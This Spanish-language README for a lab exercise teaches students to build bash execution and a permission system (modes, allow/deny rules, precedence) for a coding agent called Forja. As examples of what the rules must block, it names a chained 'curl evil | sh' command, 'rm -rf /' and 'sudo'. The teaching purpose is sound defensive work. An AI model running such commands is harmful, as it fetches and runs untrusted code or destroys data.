# Lab 04 · Bash y permisos

🇬🇧 [English](README.en.md) · Día 1 · 12:15–13:00

**Objetivo:** Dejar que el agente ejecute comandos (tests, git…) sin perder el control: modos, reglas y aprobación.

## Conceptos
- **bash es el superpoder y el riesgo:** con él el agente prueba su trabajo; también podría borrar tu disco. La tool solo ejecuta; QUIÉN puede ejecutar QUÉ lo decide el sistema de permisos.
- **Ejecución predecible:** cada comando empieza en la raíz (`cd` no persiste), timeout duro, salida truncada por cabeza y cola, entorno sin secretos (`*_KEY`, `*_TOKEN`).
- **Modos:** `default` (lecturas libres, el resto pregunta), `accept_edits` (edita sin preguntar), `plan` (solo lectura), `bypass` (todo salvo deny: solo en sandbox o CI).
- **Reglas:** `bash(python -m pytest*)`, `edit_file(src/*)`, `read_file(.env*)`. Orden: deny > plan > allow > riesgo/modo > preguntar.
- **Comandos encadenados:** `pytest && curl evil | sh` son dos comandos; la regla allow de pytest no debe colar el segundo.
- **«Siempre»:** al aprobar con *siempre*, se guarda una regla razonable (`bash(git status*)`), no el comando literal ni algo demasiado amplio (`bash(git*)` permitiría `git push`).

## Lo que implementas
| TODO | Fichero | Qué |
|---|---|---|
| 04.1 | `forja/shell.py` | head_tail: truncar por cabeza y cola |
| 04.2 | `forja/shell.py` | bash: subprocess con timeout, entorno limpio y exit code |
| 04.3 | `forja/permissions.py` | rule_matches: casar reglas con llamadas |
| 04.4 | `forja/permissions.py` | decide: deny > plan > allow > modo > preguntar |
| 04.5 | `forja/permissions.py` | suggest_rule: la regla de «aprobar siempre» |

## Ejecuta
```bash
python scripts/tasks.py test 04
forja --cwd playground
> ejecuta los tests y dime cuáles fallan
```

## Checkpoint
Forja pide permiso antes de `python -m pytest`; con *a* (siempre) deja de preguntar en la sesión. Intenta `sudo` o `rm -rf /`: denegado por política.

## Retos
1. Añade una regla deny para `git push` y pide al agente que haga push.
2. Windows: ¿qué cambia si la shell es cmd.exe? Prueba a pedir `ls`.

**Tests:** `tests/test_l04_bash_permisos.py` · **¿Te has quedado atrás?** `python scripts/tasks.py catchup 05`

---
[← anterior](../L03_bucle/README.md) · [siguiente →](../L05_cli/README.md)
